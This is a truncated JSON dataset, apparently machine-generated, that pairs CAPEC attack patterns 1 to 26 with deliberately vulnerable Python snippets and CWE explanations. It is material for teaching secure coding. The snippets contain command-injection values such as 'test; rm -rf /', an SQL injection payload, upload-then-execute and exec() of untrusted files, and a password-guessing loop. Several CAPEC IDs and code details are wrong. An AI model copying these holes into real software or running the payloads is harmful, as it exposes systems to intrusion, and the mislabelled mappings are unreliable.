[
    {
        "capec_id": "1",
        "capec_name": "Accessing Functionality Not Properly Constrained by ACLs",
        "code_snippet": "from flask import Flask, request, jsonify\n\napp = Flask(__name__)\n\n# Simulated user data\nusers = {\n    'admin': {'role': 'admin', 'data': 'Sensitive admin data'},\n    'user': {'role': 'user', 'data': 'Regular user data'}\n}\n\n# Route without proper ACL enforcement\n@app.route('/data', methods=['GET'])\ndef get_data():\n    username = request.args.get('username')\n    if username in users:\n        return jsonify({'data': users[username]['data']})\n    return jsonify({'error': 'User not found'}), 404\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a Flask web application with a route that fails to properly enforce Access Control Lists (ACLs). The `/data` endpoint allows any user to access data based on the provided username without checking the user's role or permissions. This embodies the CAPEC concept of 'Accessing Functionality Not Properly Constrained by ACLs' and highlights related CWEs such as 'Improper Authorization' (CWE-285) and 'Incorrect Permission Assignment for Critical Resource' (CWE-732). An attacker could exploit this vulnerability to access sensitive information intended for higher-privileged users."
    },
    {
        "capec_id": "2",
        "capec_name": "Inducing Account Lockout",
        "code_snippet": "import time\n\nclass Account:\n    def __init__(self, username, password):\n        self.username = username\n        self.password = password\n        self.failed_attempts = 0\n        self.locked_until = None\n\n    def is_locked(self):\n        if self.locked_until and time.time() < self.locked_until:\n            return True\n        return False\n\n    def authenticate(self, password):\n        if self.is_locked():\n            print(f\"Account {self.username} is locked. Try again later.\")\n            return False\n        if password == self.password:\n            self.failed_attempts = 0\n            print(\"Authentication successful.\")\n            return True\n        else:\n            self.failed_attempts += 1\n            if self.failed_attempts >= 3:\n                self.locked_until = time.time() + 60  # Lock account for 60 seconds\n                print(f\"Account {self.username} is locked due to too many failed attempts.\")\n            else:\n                print(\"Authentication failed.\")\n            return False\n\n# Example usage\naccount = Account(\"user1\", \"securepassword\")\n\n# Simulate failed login attempts\nfor _ in range(4):\n    account.authenticate(\"wrongpassword\")\n    time.sleep(1)\n\n# Simulate legitimate user trying to log in after account is locked\naccount.authenticate(\"securepassword\")",
        "description": "This Python code snippet demonstrates an overly restrictive account lockout mechanism, which is the main idea of the CAPEC 'Inducing Account Lockout'. The `Account` class has a method `authenticate` that locks the account for 60 seconds after three consecutive failed login attempts. This mechanism can be exploited by an attacker to lock out a legitimate user by repeatedly attempting to log in with incorrect passwords. The code also includes a check to see if the account is currently locked and prevents further login attempts during the lockout period. This example highlights the vulnerability described in CWE-645 (Overly Restrictive Account Lockout Mechanism) and CWE-307 (Improper Restriction of Excessive Authentication Attempts)."
    },
    {
        "capec_id": "3",
        "capec_name": "Using Leading 'Ghost' Character Sequences to Bypass Input Filters",
        "code_snippet": "import re\n\ndef validate_input(user_input):\n    # Early validation before canonicalization\n    if not re.match(r'^[a-zA-Z0-9]+$', user_input):\n        return False\n    \n    # Canonicalization step\n    canonical_input = user_input.lstrip('0')  # Strips leading 'ghost' characters\n    \n    # Further processing assuming input is valid\n    return canonical_input\n\n# Example usage\nuser_input = '000123abc'\nvalidated_input = validate_input(user_input)\nif validated_input:\n    print(f'Validated and canonicalized input: {validated_input}')\nelse:\n    print('Invalid input')",
        "description": "This Python code snippet demonstrates a vulnerability where input validation is performed before canonicalization, which can be exploited by an attacker using leading 'ghost' characters. The `validate_input` function first checks if the input matches a pattern of alphanumeric characters. However, this validation occurs before the input is canonicalized by stripping leading zeros. This can allow an attacker to bypass the validation by including leading zeros, which are removed later, resulting in potentially unsafe input being processed. This example embodies the main idea of CAPEC-Using Leading 'Ghost' Character Sequences to Bypass Input Filters and highlights related CWEs such as improper input validation (CWE-20), incorrect behavior order (CWE-180), and improper handling of alternate encoding (CWE-173)."
    },
    {
        "capec_id": "4",
        "capec_name": "Using Alternative IP Address Encodings",
        "code_snippet": "import socket\n\n# Function to check if an IP address is allowed\nallowed_ips = ['192.168.1.1', '10.0.0.1']\n\ndef is_ip_allowed(ip):\n    # Check if the IP is in the allowed list\n    if ip in allowed_ips:\n        return True\n    # Check if the IP in hexadecimal format is in the allowed list\n    try:\n        hex_ip = socket.inet_ntoa(bytes.fromhex(ip))\n        if hex_ip in allowed_ips:\n            return True\n    except ValueError:\n        pass\n    # Check if the IP in octal format is in the allowed list\n    try:\n        octal_ip = socket.inet_ntoa(bytes(int(ip, 8).to_bytes(4, 'big')))\n        if octal_ip in allowed_ips:\n            return True\n    except ValueError:\n        pass\n    return False\n\n# Example usage\nip_to_check = '0xc0a80101'  # Hexadecimal representation of 192.168.1.1\nif is_ip_allowed(ip_to_check):\n    print('IP is allowed')\nelse:\n    print('IP is not allowed')",
        "description": "This Python code snippet demonstrates a vulnerability related to CAPEC-273: Using Alternative IP Address Encodings. The function `is_ip_allowed` checks if an IP address is in an allowed list, but it does not properly handle alternative encodings such as hexadecimal or octal formats. An attacker could use these alternative encodings to bypass the access control checks. The code attempts to convert the input IP address from hexadecimal and octal formats to standard dotted-decimal format and checks if it is in the allowed list. However, the conversion process is flawed and does not cover all possible encodings, making it vulnerable to bypass attacks."
    },
    {
        "capec_id": "5",
        "capec_name": "Blue Boxing",
        "code_snippet": "import socket\n\n# Simulate a vulnerable communication channel\nclass VulnerableCommChannel:\n    def __init__(self, host, port):\n        self.host = host\n        self.port = port\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n    def connect(self):\n        self.sock.connect((self.host, self.port))\n        print('Connected to server')\n\n    def send_tone(self, tone):\n        # Improper verification of the source of the communication channel (CWE-940)\n        self.sock.sendall(tone.encode())\n        print(f'Sent tone: {tone}')\n\n    def receive_response(self):\n        response = self.sock.recv(1024)\n        print(f'Received response: {response.decode()}')\n\n# Example usage\nif __name__ == '__main__':\n    channel = VulnerableCommChannel('localhost', 12345)\n    channel.connect()\n    # Simulate sending a supervisor tone to reroute the line (Blue Boxing)\n    channel.send_tone('2600Hz')\n    channel.receive_response()",
        "description": "This Python code snippet simulates a vulnerable communication channel that embodies the main idea of the Blue Boxing attack described in the CAPEC. The `VulnerableCommChannel` class establishes a connection to a server and allows sending a tone, which represents the supervisor signal used in Blue Boxing attacks. The code demonstrates improper verification of the source of the communication channel (CWE-940), as it does not ensure that the tone is coming from an authorized source. This lack of proper authorization and verification can lead to unauthorized control over the communication line, similar to the historical Blue Boxing attacks on telephone systems."
    },
    {
        "capec_id": "6",
        "capec_name": "Argument Injection",
        "code_snippet": "import os\n\ndef execute_command(user_input):\n    # CWE-78: OS Command Injection\n    command = f'ls {user_input}'\n    os.system(command)\n\nif __name__ == '__main__':\n    user_input = input('Enter directory name: ')\n    execute_command(user_input)\n",
        "description": "This Python code snippet demonstrates an Argument Injection vulnerability, specifically an OS Command Injection (CWE-78). The `execute_command` function constructs an OS command using user-provided input without proper validation or neutralization of special elements. This allows an attacker to inject arbitrary commands. For example, if the user inputs `; rm -rf /`, it would execute `ls ; rm -rf /`, potentially causing significant damage. This snippet highlights the importance of validating and sanitizing user inputs to prevent such vulnerabilities."
    },
    {
        "capec_id": "7",
        "capec_name": "Blind SQL Injection",
        "code_snippet": "import sqlite3\n\n# Vulnerable function to demonstrate Blind SQL Injection\n\ndef is_user_valid(username):\n    conn = sqlite3.connect('example.db')\n    cursor = conn.cursor()\n    # Improper input validation and neutralization\n    query = f\"SELECT 1 FROM users WHERE username = '{username}' AND password = 'password123'\"\n    cursor.execute(query)\n    result = cursor.fetchone()\n    conn.close()\n    return result is not None\n\n# Example usage\nusername_input = \"' OR '1'='1\"\nif is_user_valid(username_input):\n    print(\"User is valid\")\nelse:\n    print(\"User is invalid\")",
        "description": "This Python code snippet demonstrates a Blind SQL Injection vulnerability. The function `is_user_valid` takes a username as input and constructs an SQL query without proper input validation or neutralization, making it susceptible to SQL Injection attacks. The example usage shows how an attacker can exploit this vulnerability by injecting a malicious SQL payload (`' OR '1'='1`) to bypass authentication. This code embodies the main idea of CAPEC-89 (Blind SQL Injection) and highlights related CWEs such as improper neutralization of special elements (CWE-89), improper input validation (CWE-20), and incorrect comparison (CWE-697)."
    },
    {
        "capec_id": "8",
        "capec_name": "Buffer Overflow in an API Call",
        "code_snippet": "import ctypes\n\n# Vulnerable shared library\nlib = ctypes.CDLL('./vulnerable_lib.so')\n\n# Function prototype: void vulnerable_function(char *input)\nlib.vulnerable_function.argtypes = [ctypes.c_char_p]\n\n# Input that causes buffer overflow\ninput_data = b'A' * 1024  # Assuming the buffer in the library is smaller than 1024 bytes\n\n# Call the vulnerable function\nlib.vulnerable_function(input_data)",
        "description": "This Python code snippet demonstrates a buffer overflow vulnerability in an API call to a shared library. The code uses the ctypes library to load a shared library ('vulnerable_lib.so') and calls a function ('vulnerable_function') that is vulnerable to buffer overflow. The input data is a string of 1024 'A' characters, which is assumed to be larger than the buffer size in the library, leading to a buffer overflow. This example embodies the main idea of CAPEC-1000, 'Buffer Overflow in an API Call,' and highlights related CWEs such as CWE-120 ('Classic Buffer Overflow') and CWE-119 ('Improper Restriction of Operations within the Bounds of a Memory Buffer')."
    },
    {
        "capec_id": "9",
        "capec_name": "Buffer Overflow in Local Command-Line Utilities",
        "code_snippet": "import os\nimport sys\n\ndef vulnerable_command_line_utility(user_input):\n    buffer = bytearray(100)\n    if len(user_input) > len(buffer):\n        print(\"Input is too large!\")\n        return\n    for i in range(len(user_input)):\n        buffer[i] = ord(user_input[i])\n    os.system(buffer.decode('utf-8'))\n\nif __name__ == '__main__':\n    if len(sys.argv) != 2:\n        print(\"Usage: {} <input>\".format(sys.argv[0]))\n        sys.exit(1)\n    user_input = sys.argv[1]\n    vulnerable_command_line_utility(user_input)\n",
        "description": "This Python code snippet demonstrates a vulnerable command-line utility that can be exploited to escalate privileges. The function `vulnerable_command_line_utility` takes user input and attempts to copy it into a fixed-size buffer. If the input is larger than the buffer, it prints an error message and returns. However, the code does not properly handle the buffer size, leading to potential buffer overflow (CWE-120, CWE-119). Additionally, the use of `os.system` with user input can lead to command injection (CWE-74). The code represents the main idea of the CAPEC by showing how an adversary can exploit such vulnerabilities in command-line utilities to execute arbitrary commands, potentially escalating privileges."
    },
    {
        "capec_id": "10",
        "capec_name": "Buffer Overflow via Environment Variables",
        "code_snippet": "import os\n\ndef vulnerable_function():\n    buffer = bytearray(64)\n    env_var = os.getenv('VULNERABLE_ENV_VAR')\n    if env_var:\n        # CWE-120: Buffer Copy without Checking Size of Input\n        for i in range(len(env_var)):\n            buffer[i] = ord(env_var[i])\n    print(buffer)\n\nif __name__ == '__main__':\n    vulnerable_function()",
        "description": "This Python code snippet demonstrates a buffer overflow vulnerability via environment variables, aligning with the CAPEC description. The function `vulnerable_function` retrieves an environment variable 'VULNERABLE_ENV_VAR' and copies its content into a fixed-size buffer without checking if the environment variable's length exceeds the buffer's capacity. This can lead to a buffer overflow (CWE-120). The code implicitly trusts the environment variable, which can be manipulated by an attacker to exploit the vulnerability. This example also touches on CWE-119 (Improper Restriction of Operations within the Bounds of a Memory Buffer) as it does not ensure the buffer boundaries are respected."
    },
    {
        "capec_id": "11",
        "capec_name": "Cause Web Server Misclassification",
        "code_snippet": "import os\nfrom flask import Flask, request, send_from_directory\n\napp = Flask(__name__)\nUPLOAD_FOLDER = '/path/to/uploads'\napp.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER\n\n@app.route('/upload', methods=['POST'])\ndef upload_file():\n    if 'file' not in request.files:\n        return 'No file part', 400\n    file = request.files['file']\n    if file.filename == '':\n        return 'No selected file', 400\n    file.save(os.path.join(app.config['UPLOAD_FOLDER'], file.filename))\n    return 'File uploaded successfully', 200\n\n@app.route('/files/<filename>')\ndef serve_file(filename):\n    return send_from_directory(app.config['UPLOAD_FOLDER'], filename)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a simple Flask web application that allows file uploads and serves files from a specified directory. The main idea of the CAPEC is represented by the potential for misclassification of files based on their names or extensions, which can lead to unexpected behavior. The code does not validate or sanitize the uploaded file's name or extension, which can lead to vulnerabilities such as the deployment of the wrong handler (CWE-430), reliance on the file name or extension (CWE-646), and improper restriction of file names (CWE-641). An attacker could upload a file with a misleading extension or name, causing the server to handle it inappropriately, potentially exposing sensitive information or executing unintended actions."
    },
    {
        "capec_id": "12",
        "capec_name": "Choosing Message Identifier",
        "code_snippet": "import socket\n\nclass MulticastReceiver:\n    def __init__(self, multicast_group, port):\n        self.multicast_group = multicast_group\n        self.port = port\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n        self.sock.bind(('', self.port))\n        group = socket.inet_aton(self.multicast_group)\n        mreq = struct.pack('4sL', group, socket.INADDR_ANY)\n        self.sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)\n\n    def receive_message(self):\n        while True:\n            data, _ = self.sock.recvfrom(1024)\n            message_id, message_content = data.decode().split(':', 1)\n            if self.is_privileged_message(message_id):\n                print(f'Received privileged message: {message_content}')\n            else:\n                print(f'Received message: {message_content}')\n\n    def is_privileged_message(self, message_id):\n        # Incorrectly implemented identifier check\n        return message_id == 'admin'\n\nif __name__ == '__main__':\n    receiver = MulticastReceiver('224.0.0.1', 5004)\n    receiver.receive_message()",
        "description": "This Python code snippet demonstrates a multicast receiver that listens for messages on a specified multicast group and port. The receiver processes incoming messages and checks if the message identifier is 'admin' to determine if it is a privileged message. This check is an example of an incorrect implementation of security identifier conversion (CWE-1292) and missing authentication for critical functions (CWE-306). An attacker could exploit this by sending messages with the 'admin' identifier to gain unauthorized access to privileged information, embodying the main idea of the CAPEC 'Choosing Message Identifier' attack."
    },
    {
        "capec_id": "13",
        "capec_name": "Subverting Environment Variable Values",
        "code_snippet": "import os\n\ndef authenticate_user():\n    # CWE-302: Authentication Bypass by Assumed-Immutable Data\n    user = os.getenv('USER')\n    if user == 'admin':\n        return True\n    return False\n\n# CWE-285: Improper Authorization\nif authenticate_user():\n    # CWE-73: External Control of File Name or Path\n    file_path = os.getenv('CONFIG_PATH')\n    with open(file_path, 'r') as file:\n        # CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n        config_data = file.read()\n        print(config_data)\nelse:\n    print('Access Denied')",
        "description": "This Python code snippet demonstrates a vulnerability where environment variables are subverted to manipulate the behavior of the software. The `authenticate_user` function checks the 'USER' environment variable to determine if the user is 'admin' (CWE-302). If the user is authenticated, the code proceeds to read a configuration file whose path is controlled by the 'CONFIG_PATH' environment variable (CWE-73). The contents of this file are then printed, potentially exposing sensitive information (CWE-200). This example highlights how improper handling of environment variables can lead to security issues such as authentication bypass, improper authorization, and exposure of sensitive information."
    },
    {
        "capec_id": "14",
        "capec_name": "Client-side Injection-induced Buffer Overflow",
        "code_snippet": "import socket\n\n# Hostile service that sends malicious content\nserver_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver_socket.bind(('localhost', 8080))\nserver_socket.listen(1)\n\nprint('Hostile service running on port 8080...')\n\nwhile True:\n    client_socket, addr = server_socket.accept()\n    print(f'Connection from {addr}')\n    # Malicious payload that causes buffer overflow\n    malicious_payload = 'A' * 1024  # CWE-120: Buffer Copy without Checking Size of Input\n    client_socket.send(malicious_payload.encode('utf-8'))\n    client_socket.close()",
        "description": "This Python code snippet sets up a simple hostile service that listens on port 8080 and sends a malicious payload to any connecting client. The payload is a string of 1024 'A' characters, which is intended to cause a buffer overflow in the client software that receives it. This demonstrates a 'Client-side Injection-induced Buffer Overflow' (CAPEC) by exploiting a buffer overflow vulnerability (CWE-120). The code does not include any integrity checks (CWE-353) or input validation (CWE-20), making it a clear example of how such vulnerabilities can be exploited."
    },
    {
        "capec_id": "15",
        "capec_name": "Command Delimiters",
        "code_snippet": "import os\n\ndef execute_command(user_input):\n    # Vulnerable to command injection due to improper neutralization of special elements\n    command = f'ls {user_input}'\n    os.system(command)\n\n# Example usage\nuser_input = 'test; rm -rf /'  # Malicious input\nexecute_command(user_input)",
        "description": "This Python code snippet demonstrates a command injection vulnerability, which is the main idea of the CAPEC 'Command Delimiters'. The function `execute_command` takes user input and concatenates it into a shell command without proper neutralization of special elements. This allows an attacker to inject additional commands using delimiters like semicolons. In the example usage, the malicious input 'test; rm -rf /' results in the execution of 'ls test' followed by 'rm -rf /', which can delete the root directory. This snippet embodies CWE-77 (Improper Neutralization of Special Elements used in a Command) and CWE-78 (Improper Neutralization of Special Elements used in an OS Command)."
    },
    {
        "capec_id": "16",
        "capec_name": "Dictionary-based Password Attack",
        "code_snippet": "import itertools\n\n# Dictionary of common passwords\npassword_dictionary = ['password', '123456', '123456789', 'qwerty', 'abc123', 'password1']\n\n# Simulated user database with weak passwords\nuser_db = {'user1': 'password', 'user2': '123456', 'user3': 'qwerty'}\n\n# Function to simulate login attempt\ndef login(username, password):\n    if username in user_db and user_db[username] == password:\n        return True\n    return False\n\n# Dictionary-based password attack\nfor username, stored_password in user_db.items():\n    for password in password_dictionary:\n        if login(username, password):\n            print(f\"User {username} compromised with password: {password}\")\n            break",
        "description": "This Python code snippet demonstrates a dictionary-based password attack. It uses a predefined list of common passwords (password_dictionary) to attempt to log in to user accounts in a simulated user database (user_db). The login function checks if the provided username and password match any entry in the user database. The attack iterates over each username and tries every password in the dictionary until it finds a match, printing a message when a user account is compromised. This code highlights vulnerabilities such as weak password requirements (CWE-521), reliance on single-factor authentication (CWE-308), and improper restriction of excessive authentication attempts (CWE-307)."
    },
    {
        "capec_id": "17",
        "capec_name": "Using Malicious Files",
        "code_snippet": "import os\nfrom flask import Flask, request, send_from_directory\n\napp = Flask(__name__)\nUPLOAD_FOLDER = '/path/to/uploads'\napp.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER\n\n@app.route('/upload', methods=['POST'])\ndef upload_file():\n    if 'file' not in request.files:\n        return 'No file part', 400\n    file = request.files['file']\n    if file.filename == '':\n        return 'No selected file', 400\n    file.save(os.path.join(app.config['UPLOAD_FOLDER'], file.filename))\n    return 'File uploaded successfully', 200\n\n@app.route('/execute/<filename>', methods=['GET'])\ndef execute_file(filename):\n    file_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)\n    if not os.path.exists(file_path):\n        return 'File not found', 404\n    os.system(f'chmod +x {file_path}')\n    os.system(file_path)\n    return 'File executed', 200\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet represents a vulnerable web application using the Flask framework. The application allows users to upload files and then execute them. The main idea of the CAPEC 'Using Malicious Files' is embodied here, as the application permits file uploads and subsequent execution without proper security checks. The code snippet also demonstrates several related CWEs:\n\n1. CWE-732 (Incorrect Permission Assignment for Critical Resource): The code assigns executable permissions to uploaded files without verifying their safety.\n2. CWE-285 (Improper Authorization): The code does not perform proper authorization checks before executing the uploaded files.\n3. CWE-272 (Least Privilege Violation): The code does not drop elevated privileges after assigning executable permissions.\n4. CWE-59 (Improper Link Resolution Before File Access): The code does not check if the filename resolves to a link or shortcut.\n5. CWE-282 (Improper Ownership Management): The code does not verify the ownership of the uploaded files.\n6. CWE-270 (Privilege Context Switching Error): The code does not manage privileges properly while switching contexts.\n7. CWE-693 (Protection Mechanism Failure): The code lacks sufficient protection mechanisms against directed attacks.\n\nOverall, this code snippet highlights the risks associated with allowing file uploads and executions without proper security measures."
    },
    {
        "capec_id": "18",
        "capec_name": "XSS Targeting Non-Script Elements",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/display', methods=['GET'])\ndef display():\n    user_input = request.args.get('input', '')\n    # Vulnerable to XSS in non-script elements\n    html_content = f'<img src=\"{user_input}\" alt=\"User Image\">'\n    return render_template_string(html_content)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a Flask web application that is vulnerable to Cross-Site Scripting (XSS) targeting non-script elements, specifically the 'img' tag. The application takes user input from a query parameter 'input' and directly inserts it into the 'src' attribute of an 'img' tag without proper sanitization or validation. This can allow an attacker to inject malicious scripts through the 'src' attribute, exploiting the improper neutralization of script-related HTML tags (CWE-80) and script in attributes of IMG tags (CWE-82). The code highlights the risk of XSS attacks when user input is not properly sanitized before being included in web page elements that are not typically expected to host scripts."
    },
    {
        "capec_id": "19",
        "capec_name": "Embedding Scripts within Scripts",
        "code_snippet": "import os\n\n# CWE-284: Improper Access Control\n# CWE-506: Embedded Malicious Code\n# CWE-830: Inclusion of Web Functionality from an Untrusted Source\n# CWE-79: Cross-site Scripting (XSS)\n\n# Simulate a function that executes a script from an untrusted source\n# This function is vulnerable to script embedding attacks\n\ndef execute_script(script_path):\n    if not os.path.exists(script_path):\n        raise FileNotFoundError(f\"Script {script_path} not found.\")\n    \n    with open(script_path, 'r') as file:\n        script_content = file.read()\n        \n        # CWE-79: Vulnerable to XSS if script_content is not sanitized\n        exec(script_content)  # Dangerous: executing untrusted script content\n\n# Example usage\n# An attacker can place a malicious script in 'malicious_script.py'\nexecute_script('malicious_script.py')",
        "description": "This Python code snippet demonstrates a function `execute_script` that reads and executes a script from a given file path. The function is vulnerable to several security issues: \n1. **CWE-284 (Improper Access Control)**: The function does not restrict access to the script execution, allowing any script to be executed without proper authorization checks.\n2. **CWE-506 (Embedded Malicious Code)**: The function can execute malicious code embedded within the script file, as it does not verify the integrity or trustworthiness of the script content.\n3. **CWE-830 (Inclusion of Web Functionality from an Untrusted Source)**: The function includes and executes script content from an untrusted source, potentially granting control to an attacker.\n4. **CWE-79 (Cross-site Scripting)**: If the script content includes web-related code, it could lead to XSS vulnerabilities if the content is not properly sanitized.\n\nThe main idea of the CAPEC is represented by the function's ability to execute embedded scripts within other scripts, highlighting the risks associated with executing untrusted code."
    },
    {
        "capec_id": "20",
        "capec_name": "Encryption Brute Forcing",
        "code_snippet": "import itertools\nfrom Crypto.Cipher import AES\n\n# Hard-coded key (CWE-321)\nkey = b'weakkey123456789'  # 16 bytes key for AES-128\n\n# Cipher text to be decrypted\ncipher_text = b'\\x8b\\xad\\xf0\\x0d\\x1e\\x2a\\x3c\\x4e\\x5f\\x6a\\x7b\\x8c\\x9d\\xae\\xbf\\xc0'\n\n# Brute force attack on the key space (CAPEC-116)\nfor attempt in itertools.product(range(256), repeat=16):\n    attempt_key = bytes(attempt)\n    cipher = AES.new(attempt_key, AES.MODE_ECB)\n    try:\n        plain_text = cipher.decrypt(cipher_text)\n        if b'secret' in plain_text:  # Assuming 'secret' is part of the plaintext\n            print(f'Key found: {attempt_key}')\n            print(f'Plaintext: {plain_text}')\n            break\n    except ValueError:\n        continue",
        "description": "This Python code snippet demonstrates a brute force attack on an AES-encrypted cipher text using a hard-coded key. The code iterates through all possible 16-byte keys (256^16 combinations) to find the correct key that decrypts the cipher text to a plaintext containing the word 'secret'. This embodies the concept of 'Encryption Brute Forcing' (CAPEC-116) and highlights the vulnerabilities associated with 'Inadequate Encryption Strength' (CWE-326), 'Use of a Broken or Risky Cryptographic Algorithm' (CWE-327), 'Protection Mechanism Failure' (CWE-693), and 'Use of Hard-coded Cryptographic Key' (CWE-321)."
    },
    {
        "capec_id": "21",
        "capec_name": "Exploitation of Trusted Identifiers",
        "code_snippet": "from flask import Flask, request, make_response\nimport hashlib\n\napp = Flask(__name__)\n\n# Simulated user database\nusers = {'user1': 'password1'}\nsessions = {}\n\n@app.route('/login', methods=['POST'])\ndef login():\n    username = request.form['username']\n    password = request.form['password']\n    if username in users and users[username] == password:\n        session_id = hashlib.md5(username.encode()).hexdigest()  # CWE-6: Insufficient Session-ID Length\n        sessions[session_id] = username\n        resp = make_response('Logged in')\n        resp.set_cookie('session_id', session_id, max_age=3600)  # CWE-539: Persistent Cookies with Sensitive Info\n        return resp\n    return 'Invalid credentials', 401\n\n@app.route('/profile')\ndef profile():\n    session_id = request.cookies.get('session_id')\n    if session_id in sessions:\n        return f'Welcome {sessions[session_id]}'  # CWE-346: Origin Validation Error\n    return 'Unauthorized', 401\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a simple Flask web application with a login mechanism that is vulnerable to several security issues. The main idea of the CAPEC is represented by the use of a predictable session ID and the reliance on client-side cookies for session management. The code includes the following vulnerabilities:\n\n1. CWE-6: Insufficient Session-ID Length - The session ID is generated using a simple MD5 hash of the username, making it predictable and easy to guess.\n2. CWE-539: Use of Persistent Cookies Containing Sensitive Information - The session ID is stored in a persistent cookie, which can be intercepted and reused by an attacker.\n3. CWE-346: Origin Validation Error - The application does not properly validate the source of the session ID, allowing an attacker to use a stolen or guessed session ID to impersonate a user.\n\nThese vulnerabilities allow an adversary to exploit trusted identifiers (session IDs) to perform unauthorized actions under the guise of an authenticated user."
    },
    {
        "capec_id": "22",
        "capec_name": "Exploiting Trust in Client",
        "code_snippet": "import socket\n\n# Vulnerable server code\nserver_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver_socket.bind(('localhost', 8080))\nserver_socket.listen(5)\n\nprint('Server is listening on port 8080...')\n\nwhile True:\n    client_socket, addr = server_socket.accept()\n    print(f'Connection from {addr} has been established.')\n    client_socket.send(bytes('Welcome to the server!', 'utf-8'))\n    data = client_socket.recv(1024)\n    print(f'Received data: {data.decode('utf-8')}')\n    client_socket.close()",
        "description": "This Python code snippet represents a simple server that listens for incoming connections on port 8080. The server accepts connections and receives data from clients without any form of authentication or input validation. This embodies the main idea of the CAPEC 'Exploiting Trust in Client' by demonstrating how a server implicitly trusts any client that connects to it. The related CWEs are represented as follows:\n\n- CWE-290 (Authentication Bypass by Spoofing): The server does not authenticate the client, allowing any client to connect.\n- CWE-287 (Improper Authentication): The server does not verify the identity of the client.\n- CWE-20 (Improper Input Validation): The server does not validate the received data.\n- CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor): The server could potentially send sensitive information to any connected client.\n- CWE-693 (Protection Mechanism Failure): The server lacks protection mechanisms to defend against unauthorized access or data manipulation."
    },
    {
        "capec_id": "23",
        "capec_name": "File Content Injection",
        "code_snippet": "import os\n\n# CWE-434: Unrestricted Upload of File with Dangerous Type\n# CWE-646: Reliance on File Name or Extension of Externally-Supplied File\n# CWE-20: Improper Input Validation\n\ndef upload_file(file_path):\n    # CWE-646: Relying on file extension to determine file type\n    if file_path.endswith('.txt'):\n        with open(file_path, 'r') as file:\n            content = file.read()\n            # CWE-20: No validation of file content\n            process_file(content)\n    else:\n        print(\"Unsupported file type\")\n\n# CWE-506: Embedded Malicious Code\n# CWE-433: Unparsed Raw Web Content Delivery\n# Function to process the file content\n# This function is vulnerable to file content injection\n# as it does not validate or sanitize the input\n\ndef process_file(content):\n    exec(content)  # Dangerous: executing raw content from the file\n\n# Example usage\nupload_file('malicious_payload.txt')",
        "description": "This Python code snippet demonstrates a vulnerable file upload and processing mechanism. The `upload_file` function allows the upload of a file based on its extension (CWE-646) without validating the file's content (CWE-20). If the file has a `.txt` extension, it reads the file's content and passes it to the `process_file` function. The `process_file` function then executes the file's content directly (CWE-506), which is highly dangerous as it can lead to code injection attacks. This snippet embodies the main idea of CAPEC-176 (File Content Injection) by showing how an adversary can exploit improper input validation and reliance on file extensions to inject and execute malicious code."
    },
    {
        "capec_id": "24",
        "capec_name": "Filter Failure through Buffer Overflow",
        "code_snippet": "def vulnerable_filter(input_string):\n    buffer = [''] * 10  # Fixed-size buffer\n    for i in range(len(input_string)):\n        buffer[i] = input_string[i]  # No bounds checking\n    return ''.join(buffer)\n\n# Example usage\nuser_input = 'A' * 20  # Overly long input\nprint(vulnerable_filter(user_input))",
        "description": "This Python code snippet demonstrates a vulnerable filter function that attempts to copy an input string into a fixed-size buffer without performing proper bounds checking. The buffer is defined with a fixed size of 10 elements, but the function does not check if the input string exceeds this size. As a result, if an attacker provides an overly long input string (e.g., 20 characters), it will cause a buffer overflow. This can lead to the filter failing and potentially allowing unfiltered input into the system. The code embodies the main idea of CAPEC-128 (Filter Failure through Buffer Overflow) and highlights related CWEs such as CWE-120 (Buffer Copy without Checking Size of Input) and CWE-119 (Improper Restriction of Operations within the Bounds of a Memory Buffer)."
    },
    {
        "capec_id": "25",
        "capec_name": "Forced Deadlock",
        "code_snippet": "import threading\n\n# Shared resource\nshared_resource = 0\n\n# Locks\nlock1 = threading.Lock()\nlock2 = threading.Lock()\n\n# Thread 1\ndef thread1():\n    global shared_resource\n    with lock1:\n        print('Thread 1 acquired lock1')\n        with lock2:\n            print('Thread 1 acquired lock2')\n            shared_resource += 1\n\n# Thread 2\ndef thread2():\n    global shared_resource\n    with lock2:\n        print('Thread 2 acquired lock2')\n        with lock1:\n            print('Thread 2 acquired lock1')\n            shared_resource += 1\n\n# Create threads\nthread1 = threading.Thread(target=thread1)\nthread2 = threading.Thread(target=thread2)\n\n# Start threads\nthread1.start()\nthread2.start()\n\n# Join threads\nthread1.join()\nthread2.join()\n\nprint('Shared resource value:', shared_resource)",
        "description": "This Python code snippet demonstrates a forced deadlock condition using two threads and two locks. Thread 1 acquires lock1 and then attempts to acquire lock2, while Thread 2 acquires lock2 and then attempts to acquire lock1. This creates a circular wait condition where each thread is waiting for the other to release a lock, resulting in a deadlock. The shared resource is never updated because neither thread can proceed past the lock acquisition. This example embodies the main idea of the CAPEC 'Forced Deadlock' and illustrates related CWEs such as 'Improper Locking' (CWE-667) and 'Deadlock' (CWE-833)."
    },
    {
        "capec_id": "26",
        "capec_name": "Leveraging Race Conditions",
